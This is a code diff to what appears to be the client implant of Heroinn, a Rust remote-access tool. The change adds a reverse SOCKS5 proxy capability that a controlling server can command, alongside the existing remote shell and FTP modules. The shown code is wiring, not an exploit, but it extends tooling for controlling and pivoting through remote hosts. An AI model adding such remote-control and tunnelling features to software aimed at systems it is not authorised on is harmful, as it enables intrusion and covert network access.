@@ -3,7 +3,7 @@ use heroinn_util::{
     HEART_BEAT_TIME, HeroinnClientMsgID, HeroinnProtocol, HeroinnServerCommandID, SlaveDNA,
     cur_timestamp_secs,
     dna::{CLIENT_CAPABILITY_MARKER, CONNECTION_INFO_FLAG},
-    packet::{Heartbeat, HostInfo, Message, ProxyDisplay},
+    packet::{Heartbeat, HostCapabilities, HostInfo, Message, ProxyDisplay},
     protocol::{RouteReport, Transport, TransportFactory},
     session::{ClientSession, SessionBase, SessionManager},
 };
@@ -19,7 +19,7 @@ mod config;
 mod diagnostics;
 mod module;
 
-use module::{shell::ShellClient, transfer};
+use module::{shell::ShellClient, socks5::Socks5Manager, transfer};
 
 use crate::{config::master_configure, module::ftp::FtpClient};
 
@@ -176,6 +176,9 @@ fn main() {
             remark: config.remark.clone(),
             system_proxy: Some(system_proxy_display(&route_report)),
             socks5_proxy: Some(socks5_proxy_display(&route_report)),
+            capabilities: Some(HostCapabilities {
+                socks5_reverse: true,
+            }),
         };
 
         let buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
@@ -198,6 +201,14 @@ fn main() {
         };
 
         let (sender, receriver) = channel::<Vec<u8>>();
+        let mut socks5_manager = Socks5Manager::new(
+            &clientid,
+            proto.clone(),
+            &config.address,
+            client.frozen_route().cloned(),
+            transport_factory.clone(),
+            sender.clone(),
+        );
 
         let mut client_1 = client.clone();
         std::thread::spawn(move || {
@@ -294,6 +305,7 @@ fn main() {
                         &e,
                     );
                     client.close();
+                    socks5_manager.close_all();
                     break;
                 }
             };
@@ -312,6 +324,7 @@ fn main() {
                         &e,
                     );
                     client.close();
+                    socks5_manager.close_all();
                     break;
                 }
             };
@@ -348,11 +361,12 @@ fn main() {
                         }
                     };
 
-                    match FtpClient::new_client_with_factory(
+                    match FtpClient::new_client_with_route(
                         session_sender.clone(),
                         &clientid,
                         &id,
                         transport_factory.clone(),
+                        client.frozen_route().cloned(),
                     ) {
                         Ok(session) => ftp_session_mgr.lock().unwrap().register(session),
                         Err(e) => log::error!("create ftp session failed : {}", e),
@@ -416,9 +430,20 @@ fn main() {
                         Err(e) => log::error!("apply transfer rate setting failed : {}", e),
                     }
                 }
+                Some(HeroinnServerCommandID::Socks5) => {
+                    let command = match msg.parse_socks5_server_command() {
+                        Ok(command) => command,
+                        Err(error) => {
+                            log::error!("decode SOCKS5 command failed : {}", error);
+                            continue;
+                        }
+                    };
+                    socks5_manager.handle(command);
+                }
                 None => {}
             }
         }
+        socks5_manager.close_all();
     }
 }
 
